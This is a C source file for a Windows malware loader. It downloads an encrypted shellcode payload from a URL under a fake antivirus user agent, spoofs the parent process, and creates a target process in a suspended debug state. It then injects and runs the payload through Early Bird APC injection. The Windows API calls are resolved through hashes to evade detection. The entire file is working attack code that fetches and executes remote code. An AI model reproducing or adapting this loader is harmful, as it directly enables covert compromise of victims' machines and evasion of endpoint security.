#include <stdio.h>
#include "EarlyBirdAPCInjectionObfuscated.h"
#include "Evasion.h"

BOOL GetPayloadFromUrl(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize) {

    BOOL		bSTATE = TRUE;
    HINTERNET	hInternet = NULL,
                hInternetFile = NULL;
    DWORD		dwBytesRead = NULL;
    SIZE_T		sSize = NULL;
    PBYTE		pBytes = NULL,
                pTmpBytes = NULL;

    hInternet = InternetOpenW(L"Avira", NULL, NULL, NULL, NULL);
    if (hInternet == NULL) {
        bSTATE = FALSE;
        goto _EndOfFunction;
    }

    hInternetFile = InternetOpenUrlW(hInternet, szUrl, NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
    if (hInternetFile == NULL) {
        bSTATE = FALSE;
        goto _EndOfFunction;
    }

    pTmpBytes = (PBYTE)LocalAlloc(LPTR, 1024);
    if (pTmpBytes == NULL) {
        bSTATE = FALSE;
        goto _EndOfFunction;
    }

    while (TRUE) {

        if (!InternetReadFile(hInternetFile, pTmpBytes, 1024, &dwBytesRead)) {
            bSTATE = FALSE;
            goto _EndOfFunction;
        }

        sSize += dwBytesRead;

        if (pBytes == NULL)
            pBytes = (PBYTE)LocalAlloc(LPTR, dwBytesRead);
        else
            pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);
        if (pBytes == NULL) {
            bSTATE = FALSE;
            goto _EndOfFunction;
        }

        memcpy((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);
        memset(pTmpBytes, '\0', dwBytesRead);

        if (dwBytesRead < 1024) {
            break;
        }
    }

    *pPayloadBytes = pBytes;
    *sPayloadSize = sSize;

_EndOfFunction:
    if (hInternet)
        InternetCloseHandle(hInternet);											// Closing handle 
    if (hInternetFile)
        InternetCloseHandle(hInternetFile);										// Closing handle
    if (hInternet)
        InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);	// Closing Wininet connection
    if (pTmpBytes)
        LocalFree(pTmpBytes);													// Freeing the temp buffer
    return bSTATE;
}

BOOL InjectShellcodeToRemoteProcess(HANDLE hProcess, PBYTE pShellcode, SIZE_T sSizeOfShellcode, PVOID* ppAddress) {

    SIZE_T	sNumberOfBytesWritten = NULL;
    DWORD	dwOldProtection = NULL;

    fnWriteProcessMemory pWriteProcessMemory;
    fnVirtualAllocEx pVirtualAllocEx;
    fnVirtualProtectEx pVirtualProtectEx;

    pVirtualAllocEx = NotGetProcAddress(NotGetModuleHandle(H_MOD_KERNEL32), H_FUNC_VIRTUALALLOCEX);
    pVirtualProtectEx = NotGetProcAddress(NotGetModuleHandle(H_MOD_KERNEL32), H_FUNC_VIRTUALPROTECTEX);
    pWriteProcessMemory = NotGetProcAddress(NotGetModuleHandle(H_MOD_KERNEL32), H_FUNC_WRITEPROCESSMEMORY);

    *ppAddress = pVirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (*ppAddress == NULL) {
        return FALSE;
    }

    if (!pWriteProcessMemory(hProcess, *ppAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeOfShellcode) {
        return FALSE;
    }

    if (!pVirtualProtectEx(hProcess, *ppAddress, sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
        return FALSE;
    }

    return TRUE;
}

BOOL CreateSuspendedSpoofedProcess2(HANDLE hParentProcess, LPCSTR lpProcessName, DWORD* dwProcessId, HANDLE* hProcess, HANDLE* hThread) {

    CHAR lpPath[MAX_PATH * 2];
    CHAR WnDr[MAX_PATH];
    CHAR CurrentDir[MAX_PATH];

    SIZE_T sThreadAttList = NULL;
    PPROC_THREAD_ATTRIBUTE_LIST pThreadAttList = NULL;

    STARTUPINFOEXA SiEx = { 0 };
    PROCESS_INFORMATION Pi = { 0 };

    RtlSecureZeroMemory(&SiEx, sizeof(STARTUPINFOEXA));
    RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));

    SiEx.StartupInfo.cb = sizeof(STARTUPINFOEXA);

    fnGetEnvironmentVariableA pGetEnvironmentVariableA;
    pGetEnvironmentVariableA = NotGetProcAddress(NotGetModuleHandle(H_MOD_KERNEL32), H_FUNC_GETENVIRONMENTVARIABLEA);

    if (!pGetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH)) {
        return FALSE;
    }

    sprintf(lpPath, "%s\\System32\\%s", WnDr, lpProcessName);
    sprintf(CurrentDir, "%s\\System32\\", WnDr);

    InitializeProcThreadAttributeList(NULL, 1, NULL, &sThreadAttList);
    pThreadAttList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sThreadAttList);
    if (pThreadAttList == NULL) {
        return FALSE;
    }

    if (!InitializeProcThreadAttributeList(pThreadAttList, 1, NULL, &sThreadAttList)) {
        return FALSE;
    }

    if (!UpdateProcThreadAttribute(pThreadAttList, NULL, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProcess, sizeof(HANDLE), NULL, NULL)) {
        return FALSE;
    }

    SiEx.lpAttributeList = pThreadAttList;

    fnCreateProcessA pCreateProcessA;
    pCreateProcessA = NotGetProcAddress(NotGetModuleHandle(H_MOD_KERNEL32), H_FUNC_CREATEPROCESSA);

    if (!pCreateProcessA(NULL, lpPath, NULL, NULL, FALSE, DEBUG_PROCESS | EXTENDED_STARTUPINFO_PRESENT, NULL, CurrentDir, &SiEx.StartupInfo, &Pi)) {
        return FALSE;
    }

    *dwProcessId = Pi.dwProcessId;
    *hProcess = Pi.hProcess;
    *hThread = Pi.hThread;

    DeleteProcThreadAttributeList(pThreadAttList);
    CloseHandle(hParentProcess);

    if (*dwProcessId != NULL && *hProcess != NULL && *hThread != NULL)
        return TRUE;

    return FALSE;
}

//source: https://cocomelonc.github.io/malware/2022/09/06/malware-tricks-23.html
int FindMyProcess(const char* ProcessName) {

    HANDLE hSnapshot;
    PROCESSENTRY32 pe;
    int pid = 0;
    BOOL hResult;

    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hSnapshot) return 0;

    pe.dwSize = sizeof(PROCESSENTRY32);

    hResult = Process32First(hSnapshot, &pe);

    while (hResult) {
        if (strcmp(ProcessName, pe.szExeFile) == 0) {
            pid = pe.th32ProcessID;
            break;
        }
        hResult = Process32Next(hSnapshot, &pe);
    }

    CloseHandle(hSnapshot);
    return pid;
}

int main()
{
    HANDLE hProcess = NULL;
    HANDLE hThread = NULL;
    DWORD dwProcessId = NULL;
    PVOID pAddress = NULL;

    HANDLE hParent = NULL;
    DWORD dwPPid = FindMyProcess(TARGET_PARENT);

    PBYTE Rc4CipherText = NULL;
    SIZE_T sRc4CipherText = NULL;

    //download the shellcode
    if (!GetPayloadFromUrl(PAYLOAD, &Rc4CipherText, &sRc4CipherText)) {
        return -1;
    }

    //Open process to parent
    fnOpenProcess pOpenProcess;
    pOpenProcess = NotGetProcAddress(NotGetModuleHandle(H_MOD_KERNEL32), H_FUNC_OPENPROCESS);
    if ((hParent = pOpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPPid)) == NULL) {
        return -2;
    }

    //create target remote process in debugged state
    if (!CreateSuspendedSpoofedProcess2(hParent, TARGET_PROCESS, &dwProcessId, &hProcess, &hThread)) {
        return -3;
    }

    //inject payload and get the base address
    if (!InjectShellcodeToRemoteProcess(hProcess, Rc4CipherText, sRc4CipherText, &pAddress)) {
        return -4;
    }
    //queue the APC
    fnQueueUserAPC pQueueUserAPC;
    pQueueUserAPC = NotGetProcAddress(NotGetModuleHandle(H_MOD_KERNEL32), H_FUNC_QUEUEUSERAPC);
    pQueueUserAPC((PTHREAD_START_ROUTINE)pAddress, hThread, NULL);

    //run payload
    fnDebugActiveProcessStop pDebugActiveProcessStop;
    pDebugActiveProcessStop = NotGetProcAddress(NotGetModuleHandle(H_MOD_KERNEL32), H_FUNC_DEBUGACTIVEPROCESSSTOP);
    DebugActiveProcessStop(dwProcessId);

    CloseHandle(hProcess);
    CloseHandle(hThread);

    return 0;
}